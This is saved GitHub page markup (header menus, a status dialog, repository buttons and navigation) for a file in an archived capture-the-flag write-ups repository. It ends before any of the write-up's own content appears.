            <svg class="octicon octicon-smiley" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm4.81 12.81a6.72 6.72 0 0 1-2.17 1.45c-.83.36-1.72.53-2.64.53-.92 0-1.81-.17-2.64-.53-.81-.34-1.55-.83-2.17-1.45a6.773 6.773 0 0 1-1.45-2.17A6.59 6.59 0 0 1 1.21 8c0-.92.17-1.81.53-2.64.34-.81.83-1.55 1.45-2.17.62-.62 1.36-1.11 2.17-1.45A6.59 6.59 0 0 1 8 1.21c.92 0 1.81.17 2.64.53.81.34 1.55.83 2.17 1.45.62.62 1.11 1.36 1.45 2.17.36.83.53 1.72.53 2.64 0 .92-.17 1.81-.53 2.64-.34.81-.83 1.55-1.45 2.17zM4 6.8v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2H5.2C4.53 8 4 7.47 4 6.8zm5 0v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2h-.59C9.53 8 9 7.47 9 6.8zm4 3.2c-.72 1.88-2.91 3-5 3s-4.28-1.13-5-3c-.14-.39.23-1 .66-1h8.59c.41 0 .89.61.75 1z"></path></svg>
          </div>
        </div>
        <div class="
          d-inline-block v-align-middle
          
          
           css-truncate css-truncate-target 
           user-status-message-wrapper f6" style="line-height: 20px;">
          <div class="d-inline-block text-gray-dark v-align-text-top text-left">
              <span class="text-gray ml-2">Set status</span>
          </div>
        </div>
      </div>
</summary>    <details-dialog class="details-dialog rounded-1 anim-fade-in fast Box Box--overlay" role="dialog" tabindex="-1" aria-modal="true">
      <!-- '"` --><!-- </textarea></xmp> --><form class="position-relative flex-auto js-user-status-form" action="https://github.com/users/status?compact=1&amp;link_mentions=0&amp;truncate=1" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="_method" value="put"><input type="hidden" name="authenticity_token" value="x3Ziu+DI9Q1V7aGcC9WmyXIiCJNDfLNlh29yIMRRm7p+1xNMeRxuuwj/ruTA9en5VDjZYvZrmdJgKy3hnLE6Dg==">
        <div class="Box-header bg-gray border-bottom p-3">
          <button class="Box-btn-octicon js-toggle-user-status-edit btn-octicon float-right" type="reset" aria-label="Close dialog" data-close-dialog="">
            <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
          </button>
          <h3 class="Box-title f5 text-bold text-gray-dark">Edit status</h3>
        </div>
        <input type="hidden" name="emoji" class="js-user-status-emoji-field" value="">
        <input type="hidden" name="organization_id" class="js-user-status-org-id-field" value="">
        <div class="px-3 py-2 text-gray-dark">
          <div class="js-characters-remaining-container position-relative mt-2">
            <div class="input-group d-table form-group my-0 js-user-status-form-group">
              <span class="input-group-button d-table-cell v-align-middle" style="width: 1%">
                <button type="button" aria-label="Choose an emoji" class="btn-outline btn js-toggle-user-status-emoji-picker btn-open-emoji-picker p-0">
                  <span class="js-user-status-original-emoji" hidden=""></span>
                  <span class="js-user-status-custom-emoji"></span>
                  <span class="js-user-status-no-emoji-icon">
                    <svg class="octicon octicon-smiley" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm4.81 12.81a6.72 6.72 0 0 1-2.17 1.45c-.83.36-1.72.53-2.64.53-.92 0-1.81-.17-2.64-.53-.81-.34-1.55-.83-2.17-1.45a6.773 6.773 0 0 1-1.45-2.17A6.59 6.59 0 0 1 1.21 8c0-.92.17-1.81.53-2.64.34-.81.83-1.55 1.45-2.17.62-.62 1.36-1.11 2.17-1.45A6.59 6.59 0 0 1 8 1.21c.92 0 1.81.17 2.64.53.81.34 1.55.83 2.17 1.45.62.62 1.11 1.36 1.45 2.17.36.83.53 1.72.53 2.64 0 .92-.17 1.81-.53 2.64-.34.81-.83 1.55-1.45 2.17zM4 6.8v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2H5.2C4.53 8 4 7.47 4 6.8zm5 0v-.59c0-.66.53-1.19 1.2-1.19h.59c.66 0 1.19.53 1.19 1.19v.59c0 .67-.53 1.2-1.19 1.2h-.59C9.53 8 9 7.47 9 6.8zm4 3.2c-.72 1.88-2.91 3-5 3s-4.28-1.13-5-3c-.14-.39.23-1 .66-1h8.59c.41 0 .89.61.75 1z"></path></svg>
                  </span>
                </button>
              </span>
              <text-expander keys=": @" data-mention-url="/autocomplete/user-suggestions" data-emoji-url="/autocomplete/emoji">
                <input type="text" autocomplete="off" data-no-org-url="/autocomplete/user-suggestions" data-org-url="/suggestions?mention_suggester=1" data-maxlength="80" class="d-table-cell width-full form-control js-user-status-message-field js-characters-remaining-field" placeholder="What&#39;s happening?" name="message" value="" aria-label="What is your current status?">
              </text-expander>
              <div class="error">Could not update your status, please try again.</div>
            </div>
            <div style="margin-left: 53px" class="my-1 text-small label-characters-remaining js-characters-remaining" data-suffix="remaining" hidden="">
              80 remaining
            </div>
          </div>
          <include-fragment class="js-user-status-emoji-picker" data-url="/users/status/emoji"></include-fragment>
          <div class="overflow-auto ml-n3 mr-n3 px-3 border-bottom" style="max-height: 33vh">
            <div class="user-status-suggestions js-user-status-suggestions collapsed overflow-hidden">
              <h4 class="f6 text-normal my-3">Suggestions:</h4>
              <div class="mx-3 mt-2 clearfix">
                  <div class="float-left col-6">
                      <button type="button" value=":palm_tree:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="palm_tree" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f334.png"><img class="emoji" alt="palm_tree" height="20" width="20" src="./shellcode_files/1f334.png"></g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          On vacation
                        </div>
                      </button>
                      <button type="button" value=":face_with_thermometer:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="face_with_thermometer" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f912.png"><img class="emoji" alt="face_with_thermometer" height="20" width="20" src="./shellcode_files/1f912.png"></g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Out sick
                        </div>
                      </button>
                  </div>
                  <div class="float-left col-6">
                      <button type="button" value=":house:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="house" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3e0.png"><img class="emoji" alt="house" height="20" width="20" src="./shellcode_files/1f3e0.png"></g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Working from home
                        </div>
                      </button>
                      <button type="button" value=":dart:" class="d-flex flex-items-baseline flex-items-stretch lh-condensed f6 btn-link link-gray no-underline js-predefined-user-status mb-1">
                        <div class="emoji-status-width mr-2 v-align-middle js-predefined-user-status-emoji">
                          <g-emoji alias="dart" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3af.png"><img class="emoji" alt="dart" height="20" width="20" src="./shellcode_files/1f3af.png"></g-emoji>
                        </div>
                        <div class="d-flex flex-items-center no-underline js-predefined-user-status-message ws-normal text-left" style="border-left: 1px solid transparent">
                          Focusing
                        </div>
                      </button>
                  </div>
              </div>
            </div>
            <div class="user-status-limited-availability-container">
              <div class="form-checkbox my-0">
                <input type="checkbox" name="limited_availability" value="1" class="js-user-status-limited-availability-checkbox" data-default-message="I may be slow to respond." aria-describedby="limited-availability-help-text-truncate-true-compact-true" id="limited-availability-truncate-true-compact-true">
                <label class="d-block f5 text-gray-dark mb-1" for="limited-availability-truncate-true-compact-true">
                  Busy
                </label>
                <p class="note" id="limited-availability-help-text-truncate-true-compact-true">
                  When others mention you, assign you, or request your review,
                  GitHub will let them know that you have limited availability.
                </p>
              </div>
            </div>
          </div>
            

<div class="d-inline-block f5 mr-2 pt-3 pb-2">
  <div class="d-inline-block mr-1">
    Clear status
  </div>

  <details class="js-user-status-expire-drop-down f6 dropdown details-reset details-overlay d-inline-block mr-2">
    <summary class="f5 btn-link link-gray-dark border px-2 py-1 rounded-1" aria-haspopup="true">
      <div class="js-user-status-expiration-interval-selected d-inline-block v-align-baseline">
        Never
      </div>
      <div class="dropdown-caret"></div>
    </summary>

    <ul class="dropdown-menu dropdown-menu-se pl-0 overflow-auto" style="width: 220px; max-height: 15.5em">
      <li>
        <button type="button" class="btn-link dropdown-item js-user-status-expire-button ws-normal" title="Never">
          <span class="d-inline-block text-bold mb-1">Never</span>
          <div class="f6 lh-condensed">Keep this status until you clear your status or edit your status.</div>
        </button>
      </li>
      <li class="dropdown-divider" role="none"></li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 30 minutes" value="2019-06-18T11:13:22-04:00">
            in 30 minutes
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 1 hour" value="2019-06-18T11:43:22-04:00">
            in 1 hour
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="in 4 hours" value="2019-06-18T14:43:22-04:00">
            in 4 hours
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="today" value="2019-06-18T23:59:59-04:00">
            today
          </button>
        </li>
        <li>
          <button type="button" class="btn-link dropdown-item ws-normal js-user-status-expire-button" title="this week" value="2019-06-23T23:59:59-04:00">
            this week
          </button>
        </li>
    </ul>
  </details>
  <input class="js-user-status-expiration-date-input" type="hidden" name="expires_at" value="">
</div>

          <include-fragment class="js-user-status-org-picker" data-url="/users/status/organizations"></include-fragment>
        </div>
        <div class="d-flex flex-items-center flex-justify-between p-3 border-top">
          <button type="submit" disabled="" class="width-full btn btn-primary mr-2 js-user-status-submit">
            Set status
          </button>
          <button type="button" disabled="" class="width-full js-clear-user-status-button btn ml-2 ">
            Clear status
          </button>
        </div>
</form>    </details-dialog>
  </details>
</div>

      </div>
      <div role="none" class="dropdown-divider"></div>



    <a role="menuitem" class="dropdown-item" href="https://github.com/chase1635321" data-ga-click="Header, go to profile, text:your profile">Your profile</a>
    <a role="menuitem" class="dropdown-item" href="https://github.com/chase1635321?tab=repositories" data-ga-click="Header, go to repositories, text:your repositories">Your repositories</a>

    <a role="menuitem" class="dropdown-item" href="https://github.com/chase1635321?tab=projects" data-ga-click="Header, go to projects, text:your projects">Your projects</a>

    <a role="menuitem" class="dropdown-item" href="https://github.com/chase1635321?tab=stars" data-ga-click="Header, go to starred repos, text:your stars">Your stars</a>
      <a role="menuitem" class="dropdown-item" href="https://gist.github.com/mine" data-ga-click="Header, your gists, text:your gists">Your gists</a>

    <div role="none" class="dropdown-divider"></div>
    <a role="menuitem" class="dropdown-item" href="https://help.github.com/" data-ga-click="Header, go to help, text:help">Help</a>
    <a role="menuitem" class="dropdown-item" href="https://github.com/settings/profile" data-ga-click="Header, go to settings, icon:settings">Settings</a>
    <!-- '"` --><!-- </textarea></xmp> --><form class="logout-form" action="https://github.com/logout" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="emtO3sIDLat/H+LkN/42ao8z2ugDD3tmPyAdWUM6PRbYSQhT+AuBvzXQj53xwnmZMQKY6WNbKZxMFtod+8cDJw==">
      
      <button type="submit" class="dropdown-item dropdown-signout" data-ga-click="Header, sign out, icon:logout" role="menuitem">
        Sign out
      </button>
</form>  </details-menu>
</details>

    </div>

  </header>

      

  </div>

  <div id="start-of-content" class="show-on-focus"></div>


    <div id="js-flash-container">

</div>



  <div class="application-main " data-commit-hovercards-enabled="">
        <div itemscope="" itemtype="http://schema.org/SoftwareSourceCode" class="">
    <main>
      


  



  



  <div class="flash flash-warn flash-full border-0 text-center text-bold py-2">
    This repository has been archived by the owner. It is now read-only.
  </div>

  <div class="pagehead repohead instapaper_ignore readability-menu experiment-repo-nav pt-0 pt-lg-4 ">
    <div class="repohead-details-container clearfix container-lg p-responsive d-none d-lg-block">

      <ul class="pagehead-actions">



    <li hidden="">
      

    </li>

  <li>
    
    <!-- '"` --><!-- </textarea></xmp> --><form data-remote="true" class="clearfix js-social-form js-social-container" action="https://github.com/notifications/subscribe" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="8zC9sih/TkoBr1zc5BUbbRn3QYvQqbQExPOs15xuGyg7uRGeouOL+1WcyY2h5jkC/QxQlrhPKwbjxPaiCXm9lA==">      <input type="hidden" name="repository_id" value="51316387">

      <details class="details-reset details-overlay select-menu float-left">
        <summary class="select-menu-button float-left btn btn-sm btn-with-count" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;WATCH_BUTTON&quot;,&quot;repository_id&quot;:51316387,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;,&quot;user_id&quot;:32180077}}" data-hydro-click-hmac="ef177a40b2049fca65ab10ca58dab4db4b4f55b38fa443a6e00020007559b0a6" data-ga-click="Repository, click Watch settings, action:blob#show" aria-haspopup="menu">          <span data-menu-button="">
              <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
              Watch
          </span>
</summary>        <details-menu class="select-menu-modal position-absolute mt-5" style="z-index: 99;" role="menu">
          <div class="select-menu-header">
            <span class="select-menu-title">Notifications</span>
          </div>
          <div class="select-menu-list">
            <button type="submit" name="do" value="included" class="select-menu-item width-full" aria-checked="true" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Not watching</span>
                <span class="description">Be notified only when participating or @mentioned.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Watch
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="release_only" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Releases only</span>
                <span class="description">Be notified of new releases, and when participating or @mentioned.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Unwatch releases
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="subscribed" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Watching</span>
                <span class="description">Be notified of all conversations.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-eye v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"></path></svg>
                  Unwatch
                </span>
              </div>
            </button>

            <button type="submit" name="do" value="ignore" class="select-menu-item width-full" aria-checked="false" role="menuitemradio">
              <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"></path></svg>
              <div class="select-menu-item-text">
                <span class="select-menu-item-heading">Ignoring</span>
                <span class="description">Never be notified.</span>
                <span class="hidden-select-button-text" data-menu-button-contents="">
                  <svg class="octicon octicon-mute v-align-text-bottom" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 2.81v10.38c0 .67-.81 1-1.28.53L3 10H1c-.55 0-1-.45-1-1V7c0-.55.45-1 1-1h2l3.72-3.72C7.19 1.81 8 2.14 8 2.81zm7.53 3.22l-1.06-1.06-1.97 1.97-1.97-1.97-1.06 1.06L11.44 8 9.47 9.97l1.06 1.06 1.97-1.97 1.97 1.97 1.06-1.06L13.56 8l1.97-1.97z"></path></svg>
                  Stop ignoring
                </span>
              </div>
            </button>
          </div>
        </details-menu>
      </details>
        <a class="social-count js-social-count" href="https://github.com/VulnHub/ctf-writeups/watchers" aria-label="69 users are watching this repository">
          69
        </a>
</form>
  </li>

  <li>
      <div class="js-toggler-container js-social-container starring-container ">
    <!-- '"` --><!-- </textarea></xmp> --><form class="starred js-social-form" action="https://github.com/VulnHub/ctf-writeups/unstar" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="oL34ILmlOo/7uYI+3ZamEVp6Sbpk0z8nOw6GWCkzfMRcHkSUo7+j8j6U0bBRmtkZj8hwtsEJhz+qJJDT+ua/Fg==">
      <input type="hidden" name="context" value="repository">
      <button type="submit" class="btn btn-sm btn-with-count js-toggler-target" aria-label="Unstar this repository" title="Unstar VulnHub/ctf-writeups" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;UNSTAR_BUTTON&quot;,&quot;repository_id&quot;:51316387,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;,&quot;user_id&quot;:32180077}}" data-hydro-click-hmac="7f80dce56470a7a32b13d23d5695dd6092c7168b47e2f797adde5083ba63fac2" data-ga-click="Repository, click unstar button, action:blob#show; text:Unstar">        <svg class="octicon octicon-star v-align-text-bottom" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74L14 6z"></path></svg>
        Unstar
</button>        <a class="social-count js-social-count" href="https://github.com/VulnHub/ctf-writeups/stargazers" aria-label="489 users starred this repository">
          489
        </a>
</form>
    <!-- '"` --><!-- </textarea></xmp> --><form class="unstarred js-social-form" action="https://github.com/VulnHub/ctf-writeups/star" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="NLX7Dla4/oTicJ6wqp18A+Q2OXBWnxoA0Zuom+uu3+yeYADvBZUCzCTENL46r1EWuy8zC/tFlMHUd1G9vfOFzA==">
      <input type="hidden" name="context" value="repository">
      <button type="submit" class="btn btn-sm btn-with-count js-toggler-target" aria-label="Unstar this repository" title="Star VulnHub/ctf-writeups" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;STAR_BUTTON&quot;,&quot;repository_id&quot;:51316387,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;,&quot;user_id&quot;:32180077}}" data-hydro-click-hmac="1fbe6c7e9e2f14b6b3eb545b895a03370d1f5bd8f083463236ba44943a80ab1c" data-ga-click="Repository, click star button, action:blob#show; text:Star">        <svg class="octicon octicon-star v-align-text-bottom" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74L14 6z"></path></svg>
        Star
</button>        <a class="social-count js-social-count" href="https://github.com/VulnHub/ctf-writeups/stargazers" aria-label="489 users starred this repository">
          489
        </a>
</form>  </div>

  </li>

  <li>
          <!-- '"` --><!-- </textarea></xmp> --><form class="btn-with-count" action="https://github.com/VulnHub/ctf-writeups/fork" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="zaxIO1D2opLxDec7YiyDBiCA6l6sKyvqcdRTU6B+JiKdg/yU8cyQ41pQkM8sy7rlmx3OZV236FYrLtE80cOc1A==">
            <button class="btn btn-sm btn-with-count" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;FORK_BUTTON&quot;,&quot;repository_id&quot;:51316387,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;,&quot;user_id&quot;:32180077}}" data-hydro-click-hmac="8e51b995655949ffda488ce2ded57bb6c3862c40cacfae608dfcc166a82a15b8" data-ga-click="Repository, show fork modal, action:blob#show; text:Fork" type="submit" title="Fork your own copy of VulnHub/ctf-writeups to your account" aria-label="Fork your own copy of VulnHub/ctf-writeups to your account">              <svg class="octicon octicon-repo-forked v-align-text-bottom" viewBox="0 0 10 16" version="1.1" width="10" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 1a1.993 1.993 0 0 0-1 3.72V6L5 8 3 6V4.72A1.993 1.993 0 0 0 2 1a1.993 1.993 0 0 0-1 3.72V6.5l3 3v1.78A1.993 1.993 0 0 0 5 15a1.993 1.993 0 0 0 1-3.72V9.5l3-3V4.72A1.993 1.993 0 0 0 8 1zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3 10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3-10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"></path></svg>
              Fork
</button></form>
    <a href="https://github.com/VulnHub/ctf-writeups/network/members" class="social-count" aria-label="130 users forked this repository">
      130
    </a>
  </li>
</ul>

      <h1 class="public ">
    <svg class="octicon octicon-repo" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
  <span class="author" itemprop="author"><a class="url fn" rel="author" data-hovercard-type="organization" data-hovercard-url="/orgs/VulnHub/hovercard" href="https://github.com/VulnHub">VulnHub</a></span><!--
--><span class="path-divider">/</span><!--
--><strong itemprop="name"><a data-pjax="#js-repo-pjax-container" href="https://github.com/VulnHub/ctf-writeups">ctf-writeups</a></strong>
  <span class="Label Label--outline v-align-middle ">Archived</span>

</h1>

    </div>
    
<nav class="hx_reponav reponav js-repo-nav js-sidenav-container-pjax container-lg p-responsive d-none d-lg-block" itemscope="" itemtype="http://schema.org/BreadcrumbList" aria-label="Repository" data-pjax="#js-repo-pjax-container">

  <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a class="js-selected-navigation-item selected reponav-item" itemprop="url" data-hotkey="g c" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages /VulnHub/ctf-writeups" href="https://github.com/VulnHub/ctf-writeups">
      <svg class="octicon octicon-code" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M9.5 3L8 4.5 11.5 8 8 11.5 9.5 13 14 8 9.5 3zm-5 0L0 8l4.5 5L6 11.5 2.5 8 6 4.5 4.5 3z"></path></svg>
      <span itemprop="name">Code</span>
      <meta itemprop="position" content="1">
</a>  </span>

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a itemprop="url" data-hotkey="g i" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /VulnHub/ctf-writeups/issues" href="https://github.com/VulnHub/ctf-writeups/issues">
        <svg class="octicon octicon-issue-opened" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg>
        <span itemprop="name">Issues</span>
        <span class="Counter">1</span>
        <meta itemprop="position" content="2">
</a>    </span>

  <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a data-hotkey="g p" itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls checks /VulnHub/ctf-writeups/pulls" href="https://github.com/VulnHub/ctf-writeups/pulls">
